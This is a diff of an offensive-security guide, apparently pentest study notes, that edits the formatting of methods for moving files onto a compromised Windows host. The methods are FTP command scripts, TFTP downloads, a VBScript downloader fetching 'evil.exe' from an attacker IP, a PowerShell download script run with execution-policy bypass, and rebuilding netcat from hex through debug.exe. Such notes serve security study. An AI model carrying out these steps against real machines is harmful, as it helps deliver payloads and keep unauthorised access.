@@ -4,7 +4,7 @@ Transferring files to Linux is usually pretty easy. We can use `netcat`, `wget`,
 
 ## FTP
 
-Most windows machines have a ftp-client included. But we can't use it interactively since that most  likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.
+Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.
 
 On the compromised machine we echo out the following commands into a file
 
@@ -28,10 +28,12 @@ Of course you need to have a ftp-server configured with the user asshat and the 
 ## TFTP
 
 Works by default on:  
+
 **Windows XP**  
+
 **Windows 2003**
 
-A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactivly. Which means less risk of losing your shell.
+A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell.
 
 Kali has a TFTP server build in.  
 You can server up some files with it like this
@@ -41,7 +43,7 @@ atftpd --daemon --port 69 /tftp
 /etc/init.d/atftpd restart
 ```
 
-Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening.
+Now you can put stuff in `/srv/tftp` and it will be served. Remember that TFTP used UDP. So if you run `netstat` it will not show it as listening.
 
 You can see it running like this
 
@@ -55,14 +57,14 @@ So now you can upload and download whatever from the windows-machine like this
 tftp -i 192.160.1.101 GET wget.exe
 ```
 
-If you like to test that the tftp-server is working you can test it from linux, I don't think it has a non-interative way.
+If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.
 
 ```
 tftp 192.160.1.101
 GET test.txt
 ```
 
-I usually put all files I want to make available in **/srv/tftp**
+I usually put all files I want to make available in `/srv/tftp`
 
 If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:
 
@@ -102,14 +104,14 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
 
-You then execute the script like this:  
-**cscript wget.vbs **[http://192.168.10.5/evil.exe](http://192.168.10.5/evil.exe)** evil.exe**
+You then execute the script like this:
+```
+cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
+```
 
-The script works great and I found it at the this guys gist: [https://gist.github.com/sckalath/ec7af6a1786e3de6c309](https://gist.github.com/sckalath/ec7af6a1786e3de6c309)
+## PowerShell
 
-## Powershell
-
-This is how we can download a file using powershell. Remember since we only have a non-interactive shell we can not start powershell.exe, because our shell can't handle that. But it is okay we can still run scripts in powershell.
+This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script:
 
 ```
 echo $storageDir = $pwd > wget.ps1
@@ -121,25 +123,25 @@ echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
 Now we invoke it with this crazy syntax:
 
-```
+```powershell
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
 ## Debug.exe
 
-This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe.
+This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
 
-Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that
+`Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
 
 ```
 upx -9 nc.exe
 ```
 
-Now it only weights 29 kb. Perfect.So now let's disassemble it:
+Now it only weights 29 kb. Perfect. So now let's disassemble it:
 
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
 
-Perfect, now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
+Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
 
